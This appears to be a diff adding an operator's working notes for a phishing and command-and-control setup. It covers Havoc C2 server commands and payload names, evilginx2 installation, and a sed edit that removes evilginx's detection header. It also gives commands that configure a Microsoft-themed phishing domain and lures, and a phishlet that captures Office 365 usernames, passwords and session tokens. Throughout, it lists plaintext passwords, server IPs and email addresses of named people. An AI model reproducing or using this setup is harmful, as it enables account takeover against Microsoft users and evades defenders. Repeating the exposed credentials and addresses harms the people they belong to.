@@ -1,0 +1,163 @@
+Havoc On Aruba
+demon.bin ==== ahaytwixnagxkdyaal101836.bin
+demon.exe ==== 
+demon.xml ==== 5ecca0abc8fa6bea37baf73268b0195b.xml
+demon.exe.XOR ====                                   KEY ===
+
+
+./havoc server --profile ./profiles/havoc.yaotl -v --debug
+./havoc client
+
+
+#Set up a victim account, remember to enable 2FA either via SMS or App Authenticator
+bann3r3@outlook.com
+)/9I,VP)bMi(tn1Pc?AY)t1,75k:Jn:^W7pO?g0Z
+
+root
+64.226.92.184
+HAlau(01)/9I,VP)bMi(tn1P-;A
+
+
+#Spin up a Digital Ocean Droplet (I've chooses the basic's Debian)
+https://cloud.digitalocean.com/registrations/new
+filippo.mariani@intesasanpaolo.com
+filippo.mariani@cdp.it
+@|IduIh*3ndy2CuoP)10:js8#
+
+DigitalOcean IP: 134.209.242.12
+
+#Set up your SSH Key to access the DO droplets console via SSH (you can select public-private key as well)
+SSH Keys
+root
+iT9LfC%zfzAtO`otu7hGK'd0[,Km=:d
+8Hrny4n1cl1
+
+
+https://askubuntu.com/questions/1439461/ssh-default-port-not-changing-ubuntu-22-10
+sudo systemctl reload sshd
+sudo systemctl restart sshd
+sudo systemctl stop sshd
+sudo systemctl start sshd
+sudo systemctl status sshd
+sudo ufw allow 20000
+sudo ufw enable
+sudo ufw status numbered
+sudo ufw delete 2
+sudo ufw status verbose
+
+
+
+
+
+#Command to Install evilginx2 (there is also an automated bash script for this)
+sudo apt update
+sudo apt upgrade -y
+sudo apt install git -y
+wget https://golang.org/dl/go1.20.6.linux-amd64.tar.gz
+sudo tar -xvf go1.20.6.linux-amd64.tar.gz
+sudo mv go /usr/local
+sudo nano ~/.profile
+    # At the end of the file, add the following line:
+    export PATH=$PATH:/usr/local/go/bin
+source ~/.profile
+go version
+cd /opt
+git clone https://github.com/kgretzky/evilginx2.git
+cd evilginx2
+
+
+Your training labs account has successfully been created!
+E-mail: filippo.mariani@cdp.it
+Password: F1V8z7T342XNe06h
+
+Link: https://lab.evilginx.com
+
+Link: https://discord.gg/J3ATbuM3
+
+
+
+echo "Removing evilginx indicator (X-Evilginx header)..."
+sed -i 's/req.Header.Set(p.getHomeDir(), o_host)/\/\/req.Header.Set(p.getHomeDir(), o_host)/' /home/ubuntu/src-evilginx/core/http_proxy.go
+sed -i 's/o_host := req.Host/\/\/o_host := req.Host/' /home/ubuntu/src-evilginx/core/http_proxy.go
+
+
+make
+go build
+./build/evilgnx2 -p phishlets/
+
+#Set up discoshell for OSINT gatering 
+https://github.com/foozzi/discoshell
+
+
+
+#Command to run and config evilginx2 phishing campaign
+
+config domain <domain>
+config domain fattifattituoi.it
+config ip <ip>
+config ipv4 157.230.122.155    (this of course will change accordingly)
+
+phishlets hostname <phishlet> <domain> 
+phishlets hostname microsoft fattifattituoi.it
+
+phishlets enable <phishlet> 
+phishlets enable microsoft
+
+lures create <phishlet> 
+lures create microsoft
+
+lures edit [id] redirect_url https://www.instagram.com/
+lures
+lures get-url [id]
+
+
+
+#Below is a simplified o365 phishlet
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'logon', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+sub_filters:
+auth_tokens:
+  - domain: '.live.com'
+    keys: ['.*:regexp']
+  - domain: '.live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.live.com'
+    keys: ['.*:regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: '.microsoft.com'
+    keys: ['.*:regexp']
+  - domain: '.microsoft.com'
+    keys: ['.*:regexp']
+  - domain: '.office.com'
+    keys: ['.*:regexp']
+  - domain: '.office.com'
+    keys: ['.*:regexp']
+  - domain: 'www.office.com'
+    keys: ['.*:regexp']
+  - domain: 'www.office.com'
+    keys: ['.*:regexp']
+auth_urls:
+  - '/landingv2'
+credentials:
+    username:
+      key: 'login'
+      search: '(.*)'
+      type: 'post' 
+    password:
+      key: 'passwd'
+      search: '(.*)'
+      type: 'post'
+login: 
+    domain: 'login.microsoftonline.com'
+    path: '/'
+
+
+
